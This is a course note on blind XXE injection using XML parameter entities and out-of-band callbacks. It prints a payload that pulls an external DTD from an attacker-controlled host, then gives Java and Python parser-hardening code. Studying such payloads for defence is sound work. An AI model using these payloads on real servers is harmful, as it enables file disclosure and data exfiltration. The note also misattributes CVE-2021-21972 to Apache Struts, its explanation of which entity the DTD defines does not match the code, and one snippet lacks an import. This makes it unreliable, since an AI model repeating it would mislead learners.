---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## Blind XXE with Out-of-Band Interaction via XML Parameter Entities

### What is Blind XXE?

Blind XXE is a variant of XXE where the attacker cannot see the output of the XML parsing directly. Instead, the attacker relies on indirect methods to confirm whether the attack was successful. This often involves out-of-band interactions, such as making DNS lookups or HTTP requests to a controlled server.

### Why Use XML Parameter Entities?

In some cases, the application may block regular external entities. To bypass these restrictions, attackers can use XML parameter entities. Parameter entities are defined using `%` instead of `&`. They can be used to define other entities, allowing for more complex and flexible attacks.

### How to Exploit Blind XXE with Out-of-Band Interaction

To exploit a blind XXE vulnerability with out-of-band interaction, the attacker needs to craft an XML payload that triggers an external action, such as a DNS lookup or an HTTP request. This can be achieved using XML parameter entities.

#### Example Payload

Consider the following XML payload:

```xml
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker-controlled-server.com/entity.dtd">
  %xxe;
]>
<root><data>&out;</data></root>
```

In this example, the `SYSTEM` keyword is used to reference an external DTD (`entity.dtd`) hosted on an attacker-controlled server. The `%xxe;` parameter entity is then used to include the content of the external DTD. The `&out;` entity is defined within the external DTD to trigger the desired out-of-band interaction.

#### External DTD Content

The external DTD (`entity.dtd`) might contain the following content:

```dtd
<!ENTITY % out "<!ENTITY &#x25; send SYSTEM 'http://burp-collaborator.com'>%send;">
```

This DTD defines the `%out;` parameter entity, which includes a new entity (`%send;`) that triggers an HTTP request to a Burp Collaborator server. When the XML parser processes this payload, it will make an HTTP request to the Burp Collaborator server, confirming the success of the attack.

### Real-World Example: CVE-2021-21972

CVE-2021-21972 is a real-world example of an XXE vulnerability in the Apache Struts framework. This vulnerability allowed attackers to read arbitrary files on the server by exploiting an XXE vulnerability in the `struts2-rest-plugin`.

#### Vulnerable Code

The vulnerable code in `struts2-rest-plugin` did not properly configure the XML parser to disable external entity processing. An attacker could craft an XML payload similar to the one described above to read sensitive files on the server.

#### Exploitation

An attacker could exploit this vulnerability by sending a crafted XML payload to the server, causing the XML parser to read sensitive files and exfiltrate their contents.

### How to Prevent / Defend Against XXE Attacks

#### Detection

To detect XXE vulnerabilities, organizations should regularly scan their applications for known vulnerabilities using tools like Burp Suite, OWASP ZAP, or commercial vulnerability scanners. Additionally, monitoring logs for unusual activity, such as unexpected DNS lookups or HTTP requests, can help identify potential XXE attacks.

#### Prevention

To prevent XXE attacks, applications should properly configure XML parsers to disable external entity processing. This can be achieved by setting the `external-general-entities` and `external-parameter-entities` features to `false`.

##### Secure Coding Fixes

Here is an example of how to securely configure an XML parser in Java:

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbFactory.setXIncludeAware(false);
dbFactory.setExpandEntityReferences(false);

DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(inputStream);
```

In this example, the `DocumentBuilderFactory` is configured to disable external entity processing, preventing XXE attacks.

#### Configuration Hardening

Organizations should also harden their configurations to minimize the risk of XXE attacks. This includes disabling unnecessary features in XML parsers, configuring firewalls to block interactions with external systems, and implementing strict input validation.

##### Example Configuration

Here is an example of how to configure an XML parser in Python using the `lxml` library:

```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False)
tree = etree.parse(StringIO(xml_input), parser)
```

In this example, the `resolve_entities` option is set to `False`, preventing the parser from resolving external entities.

### Hands-On Practice

For hands-on practice with XXE injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive XXE injection lab that covers various aspects of the vulnerability, including blind XXE with out-of-band interaction.
- **OWASP Juice Shop**: Provides a real-world web application with several security vulnerabilities, including XXE injection.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing web hacking techniques, including XXE injection.

These labs provide practical experience in identifying and exploiting XXE vulnerabilities, as well as learning how to defend against them.

### Conclusion

Understanding and mitigating XXE injection vulnerabilities is crucial for securing web applications. By properly configuring XML parsers, implementing strict input validation, and regularly scanning for vulnerabilities, organizations can significantly reduce the risk of XXE attacks. Hands-on practice through real-world labs is essential for mastering the skills needed to detect and prevent XXE vulnerabilities.

---
<!-- nav -->
[[02-Blind XXE Injection with Out-of-Band Interaction|Blind XXE Injection with Out-of-Band Interaction]] | [[Web Security (PortSwigger)/08-XXE Injection/05-Lab 4 Blind XXE with out of band interaction via XML parameter entities/00-Overview|Overview]] | [[04-Blind XXE with Out-of-Band Interaction|Blind XXE with Out-of-Band Interaction]]
